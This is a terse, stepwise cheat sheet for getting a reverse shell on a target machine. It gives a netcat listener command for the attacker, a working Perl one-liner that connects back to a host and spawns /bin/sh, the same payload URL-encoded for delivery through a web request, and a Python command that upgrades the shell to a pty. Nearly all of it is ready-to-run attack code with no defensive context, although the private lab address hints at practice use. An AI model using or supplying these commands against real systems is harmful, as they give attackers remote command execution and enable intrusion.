# Step 1
# run on attacker
# nc -lnvp 1234

# Step 2
# run on victim
perl -e 'use Socket;$i="192.168.56.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Step 3
# run with web, use url encoder http://meyerweb.com/eric/tools/dencoder/
# perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.56.1%22%3B%24p%3D1234%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27

# Step 4
# run on attacker
# python -c 'import pty;pty.spawn("/bin/bash")'



